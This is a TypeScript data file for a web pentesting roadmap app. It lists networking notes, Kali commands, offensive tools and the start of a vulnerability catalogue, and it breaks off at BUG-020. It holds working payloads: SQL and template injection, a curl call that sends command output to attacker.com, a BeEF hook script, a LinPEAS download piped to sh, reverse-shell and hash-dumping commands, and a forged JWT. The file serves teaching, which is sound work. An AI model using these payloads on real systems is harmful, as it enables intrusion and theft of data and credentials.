/**
 * Deep Curriculum Data for Web Pentesting Roadmap
 * Covers in-depth: Networking, Kali Linux, OSINT, 50+ Tools, 100+ Bugs, CTF Platforms, and Certification.
 */

export interface DeepNetworkingTopic {
  title: string;
  tag: string;
  summary: string;
  keyPoints: string[];
  toolsAndCommands: string[];
}

export interface DeepKaliCommand {
  command: string;
  category: "Files & Navigation" | "Searching & Grep" | "Text Processing" | "Network Diagnostics" | "Permissions & Processes" | "Bash Automation";
  description: string;
  example: string;
}

export interface DeepToolItem {
  name: string;
  category: "Proxy & Intercept" | "Network & Port Scanning" | "Subdomains & DNS" | "Fuzzing & Content Discovery" | "Vulnerability Scanning" | "OSINT & Attack Surface" | "Exploitation & Payloads" | "Post-Exploitation & Cracking";
  description: string;
  syntax: string;
  proTip: string;
}

export interface DeepBugItem {
  id: string;
  name: string;
  category: "Injection" | "Authentication & Sessions" | "Access Control & IDOR" | "Client-Side & XSS" | "SSRF & File Inclusion" | "File Upload & Parsing" | "API & Business Logic" | "Information Disclosure & Misconfigurations";
  severity: "Critical" | "High" | "Medium" | "Low" | "Informational";
  impact: string;
  testingMethod: string;
  samplePayloadOrHeader: string;
}

export interface DeepCtfPlatform {
  name: string;
  difficulty: "Beginner" | "Intermediate" | "Advanced" | "All Levels";
  category: "Cloud VM Labs" | "Web Academy" | "Locally Hosted Vulnerable Apps" | "Wargames & Live Contests";
  url: string;
  description: string;
  recommendedRooms: string[];
}

export interface DeepCertificationGuide {
  name: string;
  provider: string;
  level: "Entry Level" | "Intermediate" | "Advanced Professional";
  cost: string;
  format: string;
  description: string;
  keySyllabus: string[];
}

// ─── 1. NETWORKING DEEP-DIVE ───────────────────────────────────────────────
export const deepNetworkingTopics: DeepNetworkingTopic[] = [
  {
    title: "OSI 7-Layer Model & Security Attack Surfaces",
    tag: "Core Fundamentals",
    summary: "Complete breakdown of how data travels across all 7 layers and how hackers attack each specific layer.",
    keyPoints: [
      "Layer 1 (Physical): Hubs, cables, physical taps, hardware keyloggers.",
      "Layer 2 (Data Link): Ethernet frames, MAC addresses, ARP spoofing, CAM table overflow, VLAN hopping (802.1Q).",
      "Layer 3 (Network): IPv4/IPv6 packet headers, TTL manipulation, IP spoofing, ICMP redirect attacks, BGP route poisoning.",
      "Layer 4 (Transport): TCP vs UDP, 3-way handshake, SYN floods, port scanning, session hijacking.",
      "Layer 5 (Session): NetBIOS, RPC, SMB sessions, session resumption flaws.",
      "Layer 6 (Presentation): TLS/SSL encryption, data serialization, character encoding attacks (Unicode, UTF-7/8 bypasses).",
      "Layer 7 (Application): HTTP, DNS, SMTP, FTP, SSH — where SQLi, XSS, SSRF, IDOR and business logic bugs exist.",
    ],
    toolsAndCommands: ["wireshark", "tcpdump -i eth0 -n -s 0", "arpspoof -i eth0 -t <target> <gateway>"],
  },
  {
    title: "TCP 3-Way Handshake & Scan Mechanics",
    tag: "Transport Layer",
    summary: "Mastering SYN, ACK, FIN, RST, PSH, URG flags to understand network state tracking and firewall evasion.",
    keyPoints: [
      "Normal Connection: Client sends SYN → Server responds SYN-ACK → Client acknowledges ACK.",
      "SYN Stealth Scan (-sS): Client sends SYN → Server sends SYN-ACK → Client sends RST (never completes handshake, leaves zero app-level log).",
      "TCP Connect Scan (-sT): Full 3-way handshake (used when raw packet privileges are unavailable).",
      "Xmas Scan (-sX): Sets FIN, PSH, URG flags simultaneously. RFC 793 states closed ports respond with RST; open ports drop the packet.",
      "NULL Scan (-sN): Zero flags set. Bypasses naive stateless packet inspection firewalls.",
    ],
    toolsAndCommands: ["nmap -sS -T4 target.com", "nmap -sX -p 80 target.com", "hping3 -S -p 80 <IP>"],
  },
  {
    title: "IP Subnetting, CIDR & NAT Architecture",
    tag: "Addressing & Routing",
    summary: "IPv4/IPv6 math, subnet masks, wildcard masks, RFC 1918 private ranges, and NAT traversal.",
    keyPoints: [
      "RFC 1918 Private Ranges: 10.0.0.0/8 (10.0.0.0 - 10.255.255.255), 172.16.0.0/12, 192.168.0.0/16.",
      "CIDR Quick Math: /24 = 256 IPs (254 usable), /28 = 16 IPs (14 usable), /30 = 4 IPs (point-to-point router links).",
      "Network ID & Broadcast Address: First IP is Network ID; Last IP is Broadcast (neither can be assigned to a host).",
      "NAT (Network Address Translation): SNAT (masquerades internal IPs to public), DNAT (port forwarding to internal servers), PAT (Port Address Translation).",
      "IPv6 Features: 128-bit hex notation, SLAAC auto-configuration, no broadcast (replaced by multicast), neighbor discovery.",
    ],
    toolsAndCommands: ["ipcalc 192.168.1.0/24", "route -n", "traceroute -I target.com"],
  },
  {
    title: "Crucial Ports, Protocols & Exploitation Vectors",
    tag: "Port Protocols",
    summary: "The top ports every penetration tester must know inside out during reconnaissance.",
    keyPoints: [
      "Port 21 - FTP: Test anonymous login (`anonymous:anonymous`), banner grabbing for vsftpd 2.3.4 backdoors.",
      "Port 22 - SSH: Password brute-forcing with Hydra, weak cipher suites, private key leakage in backup files.",
      "Port 23 - Telnet: Unencrypted cleartext credentials passing over the wire.",
      "Port 25 - SMTP: User enumeration using VRFY and EXPN commands, testing for Open Mail Relays.",
      "Port 53 - DNS: DNS Zone Transfer attack (`dig axfr @ns1.target.com target.com`), subdomains leakage.",
      "Port 80 / 443 - HTTP/HTTPS: Web applications, APIs, OWASP Top 10, SSL/TLS certificate chain validation.",
      "Port 445 - SMB: EternalBlue (MS17-010), SMBGhost (CVE-2020-0796), anonymous guest shares via `smbclient`.",
      "Port 3389 - RDP: BlueKeep (CVE-2019-0708), brute force attacks, credential harvesting.",
    ],
    toolsAndCommands: ["dig axfr @ns.target.com target.com", "smbclient -L //target.com -N", "hydra -l root -P rockyou.txt ssh://<IP>"],
  },
];

// ─── 2. KALI LINUX COMMAND LINE MASTERY ────────────────────────────────────
export const deepKaliCommands: DeepKaliCommand[] = [
  // Files & Navigation
  { command: "ls -la", category: "Files & Navigation", description: "List all files including hidden dotfiles with permissions, ownership, and byte size.", example: "ls -la /var/www/html" },
  { command: "find / -perm -u=s -type f 2>/dev/null", category: "Files & Navigation", description: "Search the entire filesystem for binaries with SUID bit set for local privilege escalation.", example: "find / -perm -u=s -type f 2>/dev/null" },
  { command: "chmod 600 id_rsa", category: "Files & Navigation", description: "Set read/write permissions for owner only, mandatory for SSH private key files.", example: "chmod 600 ~/.ssh/id_rsa" },
  { command: "tar -czvf backup.tar.gz /var/www", category: "Files & Navigation", description: "Compress an entire directory into a gzipped tar archive for exfiltration.", example: "tar -czvf loot.tar.gz ./loot" },

  // Searching & Grep
  { command: "grep -rnw '/var/www' -e 'api_key\\|password\\|secret'", category: "Searching & Grep", description: "Recursively search files in a directory for sensitive leaked credentials and API tokens.", example: "grep -rnwi '.' -e 'db_password'" },
  { command: "which <tool> && whereis <tool>", category: "Searching & Grep", description: "Locate binary executable path, source files, and man pages for any utility.", example: "which burpsuite" },

  // Text Processing
  { command: "cat urls.txt | awk -F'/' '{print $3}' | sort -u", category: "Text Processing", description: "Extract hostnames from a list of URLs and deduplicate the list.", example: "cat endpoints.txt | awk '{print $1}' | sort -u > targets.txt" },
  { command: "sed 's/http:\\/\\///g' urls.txt | tr -d '/'", category: "Text Processing", description: "Stream editor string substitution to strip protocol prefixes from wordlists.", example: "sed 's/https:\\/\\///g' list.txt" },
  { command: "cut -d':' -f1 /etc/passwd", category: "Text Processing", description: "Parse specific delimited columns from text files (extract all system usernames).", example: "cut -d':' -f1 /etc/passwd" },

  // Network Diagnostics
  { command: "ss -tulwn", category: "Network Diagnostics", description: "Show all active TCP and UDP listening ports and sockets without resolving hostnames.", example: "ss -tulwn | grep LISTEN" },
  { command: "curl -I -k https://target.com", category: "Network Diagnostics", description: "Fetch HTTP response headers only, ignoring SSL certificate errors to inspect server tech.", example: "curl -I -k https://target.com" },
  { command: "tcpdump -i any -n 'port 80 or port 443' -w capture.pcap", category: "Network Diagnostics", description: "Sniff raw web traffic on all interfaces and save into a Wireshark-compatible PCAP file.", example: "tcpdump -i eth0 -w traffic.pcap" },

  // Permissions & Processes
  { command: "ps aux | grep -v 'root'", category: "Permissions & Processes", description: "Inspect all non-root running processes to spot third-party custom scripts running as service accounts.", example: "ps aux | grep python" },
  { command: "chown -R www-data:www-data /var/www/html", category: "Permissions & Processes", description: "Recursively change ownership of files to web server daemon user.", example: "chown user:user script.sh" },

  // Bash Automation
  { command: "for sub in $(cat subs.txt); do httpx -u $sub -silent; done", category: "Bash Automation", description: "Loop through discovered subdomains and check live HTTP/HTTPS status in real time.", example: "cat subs.txt | httpx -title -status-code -mc 200,302" },
];

// ─── 3. 50+ SECURITY TOOLS MATRIX ──────────────────────────────────────────
export const deepToolsList: DeepToolItem[] = [
  // Proxy & Intercept
  { name: "Burp Suite Professional", category: "Proxy & Intercept", description: "The industry standard web penetration testing proxy suite with Repeater, Intruder, Collaborator, and Decoder.", syntax: "burpsuite &", proTip: "Use Turbo Intruder extension with custom Python scripts to test race conditions without socket latency." },
  { name: "OWASP ZAP (Zed Attack Proxy)", category: "Proxy & Intercept", description: "Free, open-source automated and manual web vulnerability scanner from the OWASP foundation.", syntax: "zaproxy", proTip: "Ideal for automated CI/CD pipeline integration using the ZAP Docker baseline scan." },
  { name: "Caido", category: "Proxy & Intercept", description: "Lightweight, modern Rust-based web security proxy designed for speed, low RAM overhead, and cloud hosting.", syntax: "caido", proTip: "Runs seamlessly on headless remote VPS droplets with a web browser frontend." },
  { name: "Fiddler Everywhere", category: "Proxy & Intercept", description: "Cross-platform HTTP debugging proxy useful for complex API inspection and mobile app traffic tracing.", syntax: "fiddler", proTip: "Great for decrypting TLS traffic on Android and iOS devices." },

  // Network & Port Scanning
  { name: "Nmap (Network Mapper)", category: "Network & Port Scanning", description: "The definitive host discovery, port scanning, service version detection, and OS fingerprinting engine.", syntax: "nmap -sV -sC -p- -T4 -oA target_scan 192.168.1.1", proTip: "Always run with `-oA` to export results in normal, XML, and grepable formats for later scripting." },
  { name: "Masscan", category: "Network & Port Scanning", description: "Massive scale asynchronous TCP port scanner capable of scanning the entire IPv4 Internet in 6 minutes.", syntax: "masscan -p1-65535 <IP/CIDR> --rate=10000", proTip: "Use Masscan to discover open ports rapidly, then feed open ports to Nmap for deep version scanning." },
  { name: "Rustscan", category: "Network & Port Scanning", description: "Modern port scanner built in Rust that completes 65k port scans in seconds and auto-pipes into Nmap.", syntax: "rustscan -a target.com -- -sC -sV", proTip: "Cuts initial external reconnaissance time down from 20 minutes to 3 seconds." },
  { name: "Naabu", category: "Network & Port Scanning", description: "ProjectDiscovery's fast, reliable SYN/CONNECT port scanner designed for integration into recon pipelines.", syntax: "naabu -host target.com -top-ports 1000", proTip: "Pipes directly from `subfinder` output: `subfinder -d target.com | naabu`." },
  { name: "Hping3", category: "Network & Port Scanning", description: "Custom packet craft engine for TCP/IP testing, firewall rule probing, and MTU discovery.", syntax: "hping3 -S -p 80 -c 5 target.com", proTip: "Test if a WAF or firewall drops spoofed SYN packets or sends RST replies." },

  // Subdomains & DNS
  { name: "Subfinder", category: "Subdomains & DNS", description: "Fast passive subdomain enumeration tool that queries dozens of online passive data sources.", syntax: "subfinder -d target.com -all -silent -o subs.txt", proTip: "Configure `provider-config.yaml` with free API keys (SecurityTrails, Censys) to double your results." },
  { name: "Amass (OWASP)", category: "Subdomains & DNS", description: "In-depth attack surface mapping and active/passive DNS asset discovery using graph databases.", syntax: "amass enum -passive -d target.com", proTip: "Use `amass intel` to discover ASN numbers and CIDR IP ranges registered by your target company." },
  { name: "Assetfinder", category: "Subdomains & DNS", description: "Minimalist, lightning-fast Go tool by tomnomnom for finding domains and subdomains related to a given domain.", syntax: "assetfinder --subs-only target.com", proTip: "Essential component for building bash one-liner recon pipelines." },
  { name: "Findomain", category: "Subdomains & DNS", description: "Blazing fast Rust-based cross-platform tool for monitoring and discovering new subdomains.", syntax: "findomain -t target.com -u resolved.txt", proTip: "Supports Telegram and Discord webhook notifications when new subdomains spin up." },
  { name: "Chaos Client", category: "Subdomains & DNS", description: "ProjectDiscovery client for querying public bug bounty datasets containing hundreds of millions of subdomains.", syntax: "chaos -d target.com -key <API_KEY>", proTip: "Instantly downloads thousands of historical subdomains in under 2 seconds." },
  { name: "DNSx", category: "Subdomains & DNS", description: "Fast multi-purpose DNS toolkit allowing automated resolution, wildcard filtering, and DNS record queries.", syntax: "dnsx -l subs.txt -resp -o live_hosts.txt", proTip: "Automatically eliminates DNS wildcard false positives that contaminate recon datasets." },
  { name: "PureDNS", category: "Subdomains & DNS", description: "Fast mass DNS resolver and bruteforcer capable of resolving millions of domains using public resolvers.", syntax: "puredns bruteforce wordlist.txt target.com -r resolvers.txt", proTip: "Always sanitize public resolver lists before running to prevent spoofed DNS responses." },

  // Fuzzing & Content Discovery
  { name: "ffuf (Fuzz Faster U Fool)", category: "Fuzzing & Content Discovery", description: "Fast web fuzzer written in Go for discovering hidden directories, files, parameters, and virtual hosts.", syntax: "ffuf -u https://target.com/FUZZ -w SecLists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301", proTip: "Use `-fc 404` and `-fs <bytes>` to filter out custom 404 response body sizes." },
  { name: "Gobuster", category: "Fuzzing & Content Discovery", description: "High-concurrency directory, DNS, vhost, and S3 bucket brute-forcer written in Go.", syntax: "gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -t 50", proTip: "Use `gobuster vhost` with a Host header wordlist to find hidden intranet staging domains." },
  { name: "Feroxbuster", category: "Fuzzing & Content Discovery", description: "Fast, recursive directory discovery tool written in Rust with forced browsing and automated rate handling.", syntax: "feroxbuster -u https://target.com -w common.txt --depth 3", proTip: "Recursively dives into newly discovered directories automatically without manual re-runs." },
  { name: "Dirsearch", category: "Fuzzing & Content Discovery", description: "Feature-packed advanced web path brute-forcer supporting complex extensions, cookies, and HTTP proxies.", syntax: "dirsearch -u https://target.com -e php,html,js,json -x 404,403", proTip: "Includes specialized wordlists that look for backup files like `.config.php.bak`." },
  { name: "Katana", category: "Fuzzing & Content Discovery", description: "Next-gen crawling and spidering engine supporting headless Chrome rendering for JavaScript heavy SPA apps.", syntax: "katana -u https://target.com -headless -d 3", proTip: "Finds hidden API endpoints dynamically created by React, Vue, and Angular applications." },
  { name: "Hakrawler", category: "Fuzzing & Content Discovery", description: "Tomnomnom-style lightweight crawler to gather endpoints, forms, and JS files from a list of URLs.", syntax: "echo 'https://target.com' | hakrawler", proTip: "Pipe output to `grep -E '\\.js$'` to immediately extract all JavaScript bundles for secret hunting." },
  { name: "GAU (Get All URLs)", category: "Fuzzing & Content Discovery", description: "Fetches known URLs from AlienVault's OTX, Wayback Machine, and Common Crawl for any target domain.", syntax: "gau target.com --subs", proTip: "Historical endpoints often expose forgotten PHP files, old API versions (v1), and test credentials." },
  { name: "Waybackurls", category: "Fuzzing & Content Discovery", description: "Fetches all URLs that the Wayback Machine has ever captured for a specific domain.", syntax: "waybackurls target.com", proTip: "Filter output with `grep -i '=http'` to spot legacy open redirects and SSRF parameters." },
  { name: "Arjun", category: "Fuzzing & Content Discovery", description: "HTTP parameter discovery suite that quickly identifies hidden query and POST body parameters.", syntax: "arjun -u https://target.com/page.php -m GET", proTip: "Discovers unlinked parameters like `?debug=true`, `?admin=1`, and `?redirect=`." },

  // Vulnerability Scanning
  { name: "Nuclei", category: "Vulnerability Scanning", description: "Fast, template-based vulnerability scanner with thousands of community-crafted YAML vulnerability signatures.", syntax: "nuclei -u https://target.com -t cves/ -severity critical,high", proTip: "Write custom 10-line YAML templates for 0-day exploits to scan your entire recon database in minutes." },
  { name: "SQLmap", category: "Vulnerability Scanning", description: "Automatic SQL injection and database takeover tool that detects and exploits all SQLi categories.", syntax: "sqlmap -u 'https://target.com/item?id=1' --batch --dbs", proTip: "Save a raw HTTP request from Burp into a text file and run `sqlmap -r req.txt --level=3 --risk=2`." },
  { name: "Dalfox", category: "Vulnerability Scanning", description: "Powerful, parameter-focused Cross-Site Scripting (XSS) scanner with integrated DOM analysis and PoC generation.", syntax: "dalfox url https://target.com/search?q=test", proTip: "Supports testing for DOM XSS, Blind XSS via XSS hunter, and header-based injection vectors." },
  { name: "Commix", category: "Vulnerability Scanning", description: "Automated command injection exploitation engine that automates detection and shell dropping.", syntax: "commix --url='https://target.com/ping?ip=127.0.0.1'", proTip: "Automates escaping complex quote boundaries and base64 pipes to establish reverse shells." },
  { name: "Nikto", category: "Vulnerability Scanning", description: "Classic web server assessment scanner that tests for over 6,700 potentially dangerous files and outdated CGIs.", syntax: "nikto -h https://target.com", proTip: "Great for quick compliance audits to spot outdated Apache, Nginx, or IIS versions." },
  { name: "CRLFsuite", category: "Vulnerability Scanning", description: "Fast tool for testing CRLF injection (HTTP response splitting, cookie injection, and header poisoning).", syntax: "crlfsuite -u 'https://target.com/?url='", proTip: "Test if `\\r\\nSet-Cookie: admin=1` sets custom cookies in client browsers." },
  { name: "Gxss / Kxss", category: "Vulnerability Scanning", description: "Lightweight utilities to reflect special characters (`\"`, `'`, `<`, `>`) in URLs to find candidate XSS endpoints.", syntax: "cat urls.txt | kxss", proTip: "Filter thousands of URLs down to the 5 that actually reflect unencoded HTML characters." },

  // OSINT & Attack Surface
  { name: "Shodan", category: "OSINT & Attack Surface", description: "Search engine for Internet-connected devices, industrial control systems, webcams, and open databases.", syntax: "shodan search 'org:Target ssl.cert.subject.CN:target.com'", proTip: "Search `ssl.cert.subject.CN:\"target.com\" 200` to find origin IP addresses bypassing Cloudflare." },
  { name: "Censys", category: "OSINT & Attack Surface", description: "Search engine for internet intelligence that indexes TLS certificates, open ports, and protocols.", syntax: "censys search 'services.tls.certificates.leaf_data.subject.common_name: target.com'", proTip: "Use Censys to find forgotten staging servers that expose default phpMyAdmin or Jenkins logins." },
  { name: "TruffleHog", category: "OSINT & Attack Surface", description: "Scans Git repositories for leaked secrets, private keys, AWS access tokens, and passwords with high entropy.", syntax: "trufflehog git https://github.com/target/repo", proTip: "Scans past Git commit histories where developers committed and later deleted secret API keys." },
  { name: "GitDorks", category: "OSINT & Attack Surface", description: "Automated dorking tool that scans GitHub for leaked confidential code, credentials, and endpoints.", syntax: "python3 gitdorks.py -t <GitHub_Token> -q target.com", proTip: "Look for `.dockercfg`, `.bash_history`, and `aws_secret_access_key` belonging to employee usernames." },
  { name: "TheHarvester", category: "OSINT & Attack Surface", description: "Gathers emails, employee names, subdomains, IPs, and open ports from multiple public data sources.", syntax: "theHarvester -d target.com -b all", proTip: "Collect employee email patterns (`first.last@target.com`) for password spraying and social engineering." },
  { name: "SpiderFoot", category: "OSINT & Attack Surface", description: "Open source automated OSINT intelligence tool integrating over 200 modules for full footprinting.", syntax: "sf.py -l 127.0.0.1:5001", proTip: "Generates visual node graphs linking domain names, IP addresses, subnets, and email leaks." },

  // Exploitation & Payloads
  { name: "Metasploit Framework", category: "Exploitation & Payloads", description: "The world's most widely used penetration testing platform with thousands of exploits, auxiliary scanners, and payloads.", syntax: "msfconsole -q", proTip: "Use `exploit/multi/handler` with staged Meterpreter payloads for handling incoming reverse connections." },
  { name: "Searchsploit", category: "Exploitation & Payloads", description: "Offline command line search utility for Exploit-DB, allowing instant searches without an internet connection.", syntax: "searchsploit apache 2.4.49", proTip: "Use `searchsploit -m <id>` to mirror the actual exploit code directly into your current directory." },
  { name: "BeEF (Browser Exploitation Framework)", category: "Exploitation & Payloads", description: "Penetration testing tool focusing on exploiting web browsers through client-side XSS attack vectors.", syntax: "beef-xss", proTip: "Hook a browser via XSS payload `<script src=http://your-ip:3000/hook.js></script>` to demonstrate full account takeover." },

  // Post-Exploitation & Cracking
  { name: "LinPEAS", category: "Post-Exploitation & Cracking", description: "Linux Privilege Escalation Awesome Script that searches for possible paths to escalate privileges on Linux hosts.", syntax: "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh", proTip: "Red/Yellow highlight colors indicate a 99% guaranteed privilege escalation vector." },
  { name: "Chisel", category: "Post-Exploitation & Cracking", description: "Fast TCP/UDP tunnel over HTTP secured via SSH, perfect for pivoting through compromised web servers into internal LANs.", syntax: "chisel server -p 8000 --reverse", proTip: "Tunnel SOCKS5 traffic through restricted outbound firewalls that only permit port 80/443." },
  { name: "Hashcat", category: "Post-Exploitation & Cracking", description: "The world's fastest GPU-based password recovery and hash cracking engine supporting hundreds of hash algorithms.", syntax: "hashcat -m 0 -a 0 hashes.txt rockyou.txt", proTip: "Use rule-based attacks (`-r /usr/share/hashcat/rules/best64.rule`) to crack mutated passwords." },
  { name: "John the Ripper", category: "Post-Exploitation & Cracking", description: "Fast, versatile password cracker supporting customizable wordlists, custom rules, and shadow file cracking.", syntax: "john --wordlist=rockyou.txt hashes.txt", proTip: "Use `unshadow /etc/passwd /etc/shadow > combined.txt` before cracking Linux password hashes." },
  { name: "Recon-ng", category: "OSINT & Attack Surface", description: "Full-featured reconnaissance framework designed to provide a powerful environment for open source web-based reconnaissance.", syntax: "recon-ng", proTip: "Equip API keys for VirusTotal, Shodan, and Censys into recon-ng workspace for fully automated OSINT pipelines." },
  { name: "Gitleaks", category: "OSINT & Attack Surface", description: "Fast, lightweight SAST scanner for detecting hardcoded secrets like passwords, API keys, and tokens in git repos.", syntax: "gitleaks detect --source=. -v", proTip: "Run gitleaks in pre-commit hooks or automated CI/CD audits to catch developer credentials before deployment." },
  { name: "WafW00f", category: "Vulnerability Scanning", description: "Detects and fingerprints Web Application Firewalls (Cloudflare, AWS WAF, Akamai, Imperva, ModSecurity) protecting a website.", syntax: "wafw00f https://target.com", proTip: "Always run WafW00f first so you don't burn wordlists or IP addresses triggering Cloudflare 1020 blocks." },
  { name: "Netcat (nc / ncat)", category: "Network & Port Scanning", description: "The classic networking Swiss Army knife for reading, writing, binding ports, and spawning reverse shell listeners.", syntax: "nc -lvnp 4444", proTip: "Upgrade raw dumb Netcat shells to fully interactive TTYs with `python3 -c 'import pty; pty.spawn(\"/bin/bash\")'`." },
  { name: "Responder", category: "Exploitation & Payloads", description: "LLMNR, NBT-NS, and MDNS poisoner that captures NTLMv1/NTLMv2 authentication hashes across local networks and internal webapps.", syntax: "sudo responder -I eth0 -dwv", proTip: "Combine with internal SSRF vulnerabilities requesting `file://<attacker-ip>/share` to steal Windows NetNTLM hashes." },
  { name: "Impacket", category: "Exploitation & Payloads", description: "Collection of Python classes for working with network protocols (SMB, Kerberos, WMI, MSSQL) during internal pentesting.", syntax: "impacket-psexec administrator@10.10.10.5", proTip: "Use `impacket-secretsdump` to remotely dump SAM and LSA secrets once local administrative credentials are confirmed." },
  { name: "CyberChef", category: "Post-Exploitation & Cracking", description: "The cyber Swiss Army Knife web app for encoding, decoding, encryption, parsing, and hashing operations.", syntax: "https://gchq.github.io/CyberChef/", proTip: "Chain 'From Base64', 'Gunzip', and 'JSON Beautify' recipes to reverse engineer complex serialized JWT tokens." },
];

// ─── 4. 100+ BUGS & VULNERABILITIES ENCYCLOPEDIA ───────────────────────────
export const deepBugsList: DeepBugItem[] = [
  // ── INJECTION BUGS (15) ──
  { id: "BUG-001", name: "SQL Injection (In-Band / Union-Based)", category: "Injection", severity: "Critical", impact: "Full database read/write access, bypass authentication, and potential OS command execution.", testingMethod: "Inject `' UNION SELECT 1,2,table_name FROM information_schema.tables-- -` into query parameters.", samplePayloadOrHeader: "' UNION SELECT NULL,username,password FROM users--" },
  { id: "BUG-002", name: "SQL Injection (Error-Based)", category: "Injection", severity: "Critical", impact: "Extracts database schema and sensitive records through forced database syntax errors.", testingMethod: "Inject mathematical syntax payloads like `AND (SELECT 1 FROM (SELECT COUNT(*),concat((SELECT version()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)`.", samplePayloadOrHeader: "' AND extractvalue(1, concat(0x7e, (SELECT @@version)))--" },
  { id: "BUG-003", name: "SQL Injection (Boolean Blind)", category: "Injection", severity: "High", impact: "Dumps database character-by-character by observing true/false conditional web responses.", testingMethod: "Inject `AND 1=1` vs `AND 1=2` and observe differences in page length, status code, or content.", samplePayloadOrHeader: "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--" },
  { id: "BUG-004", name: "SQL Injection (Time-Based Blind)", category: "Injection", severity: "High", impact: "Dumps data when no response change occurs by measuring server sleep delays.", testingMethod: "Inject `pg_sleep(5)`, `WAITFOR DELAY '0:0:5'`, or `SLEEP(5)` and verify response delay.", samplePayloadOrHeader: "'; IF (SELECT count(*) FROM users)>0 WAITFOR DELAY '0:0:5'--" },
  { id: "BUG-005", name: "SQL Injection (Out-of-Band / DNS Exfiltration)", category: "Injection", severity: "Critical", impact: "Exfiltrates database contents via DNS queries even when responses are completely blind.", testingMethod: "Trigger DNS resolution to Burp Collaborator via `LOAD_FILE(concat('\\\\',database(),'.burpcollab.net\\a'))`.", samplePayloadOrHeader: "'; EXEC master..xp_dirtree '\\\\'+(SELECT user)+'.oob.burpcollaborator.net\\a'--" },
  { id: "BUG-006", name: "Remote OS Command Injection", category: "Injection", severity: "Critical", impact: "Execute arbitrary bash/cmd system commands on the underlying web server host.", testingMethod: "Append shell command separators `;`, `&&`, `|`, `$(whoami)`, `` `id` `` to input fields.", samplePayloadOrHeader: "127.0.0.1; whoami; cat /etc/passwd" },
  { id: "BUG-007", name: "Blind OS Command Injection", category: "Injection", severity: "Critical", impact: "Execute system commands without seeing stdout; verify via ping or sleep delays.", testingMethod: "Inject `; sleep 10;` or `; ping -c 5 <collaborator_host>;` and measure execution time.", samplePayloadOrHeader: "; curl http://attacker.com/$(whoami)" },
  { id: "BUG-008", name: "Server-Side Template Injection (SSTI - Jinja2)", category: "Injection", severity: "Critical", impact: "Arbitrary code execution on Python Flask/Django backends.", testingMethod: "Input `{{7*7}}`. If page reflects `49`, exploit Python MRO to reach `os.popen()`.", samplePayloadOrHeader: "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}" },
  { id: "BUG-009", name: "Server-Side Template Injection (SSTI - Twig/Smarty)", category: "Injection", severity: "Critical", impact: "Remote code execution on PHP web applications.", testingMethod: "Input `{{7*'7'}}` in Twig or `{php}echo 'test';{/php}` in Smarty templates.", samplePayloadOrHeader: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}" },
  { id: "BUG-010", name: "CRLF / HTTP Header Injection", category: "Injection", severity: "Medium", impact: "HTTP response splitting, cookie poisoning, cache poisoning, and reflected XSS.", testingMethod: "Inject URL-encoded `\\r\\n` (`%0d%0a`) into redirect parameters to append headers.", samplePayloadOrHeader: "https://target.com/?redirect=%0d%0aSet-Cookie:session=hijacked" },
  { id: "BUG-011", name: "LDAP Injection", category: "Injection", severity: "High", impact: "Bypass authentication or extract user directory records from active directory.", testingMethod: "Inject `*`, `)(cn=*))`, `)(&)` into login fields talking to LDAP authentication.", samplePayloadOrHeader: "*)(uid=*))(|(uid=*" },
  { id: "BUG-012", name: "XPath Injection", category: "Injection", severity: "High", impact: "Query and extract sensitive XML database documents.", testingMethod: "Inject `' or '1'='1` or `' or count(parent::*)=0 or 'a'='b` into search fields.", samplePayloadOrHeader: "' or 1=1 or ''='" },
  { id: "BUG-013", name: "NoSQL Injection (MongoDB)", category: "Injection", severity: "High", impact: "Bypass authentication in Node.js/MongoDB apps and extract collections.", testingMethod: "Send JSON request with `{\"$gt\": \"\"}` or `{\"$ne\": null}` in password fields.", samplePayloadOrHeader: "{\"username\": \"admin\", \"password\": {\"$ne\": \"\"}}" },
  { id: "BUG-014", name: "HTML Injection (Reflected / Stored)", category: "Injection", severity: "Medium", impact: "Inject arbitrary HTML elements, phishing forms, and defacement.", testingMethod: "Inject `<h1>Testing</h1>` or `<form action='http://evil.com'>` into user input.", samplePayloadOrHeader: "<h1>System Maintenance - Re-enter credentials:</h1><input type=password>" },
  { id: "BUG-015", name: "Client-Side Template Injection (CSTI - AngularJS)", category: "Injection", severity: "High", impact: "Execute client-side JavaScript by escaping AngularJS sandbox.", testingMethod: "Inject `{{constructor.constructor('alert(1)')()}}` into pages rendered by Angular.", samplePayloadOrHeader: "{{$on.constructor('alert(document.domain)')()}}" },

  // ── AUTHENTICATION & SESSIONS (15) ──
  { id: "BUG-016", name: "Broken Authentication (Username Enumeration)", category: "Authentication & Sessions", severity: "Low", impact: "Harvest valid user emails and usernames for targeted password brute-forcing.", testingMethod: "Compare response messages ('User does not exist' vs 'Invalid password') or response times.", samplePayloadOrHeader: "Response Diff: 'Invalid email' vs 'Wrong password'" },
  { id: "BUG-017", name: "Missing Rate Limiting on Login / OTP", category: "Authentication & Sessions", severity: "High", impact: "Account takeover via 4-digit or 6-digit OTP brute-force.", testingMethod: "Send 1,000 OTP verification requests via Burp Intruder using `Null Payloads`.", samplePayloadOrHeader: "Intruder payload: Numbers 0000 to 9999" },
  { id: "BUG-018", name: "Session Fixation", category: "Authentication & Sessions", severity: "Medium", impact: "Attacker pre-sets a session ID and hijacks account once victim authenticates.", testingMethod: "Set custom cookie `session_id=123`, log in, and check if server issues a new session ID.", samplePayloadOrHeader: "Cookie: PHPSESSID=attacker_controlled_value" },
  { id: "BUG-019", name: "Session Not Invalidated on Logout", category: "Authentication & Sessions", severity: "Medium", impact: "Replaying old session cookies grants ongoing unauthorized access.", testingMethod: "Copy session cookie, click Logout, then replay old cookie in Burp Repeater.", samplePayloadOrHeader: "Replayed Authorization header: Bearer <old_token>" },
  { id: "BUG-020", name: "JWT 'none' Algorithm Vulnerability", category: "Authentication & Sessions", severity: "Critical", impact: "Forge any JWT token to elevate privileges to admin without knowing the secret.", testingMethod: "Change header `{\"alg\": \"none\"}`, change payload `{\"role\": \"admin\"}`, strip signature.", samplePayloadOrHeader: "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9." },
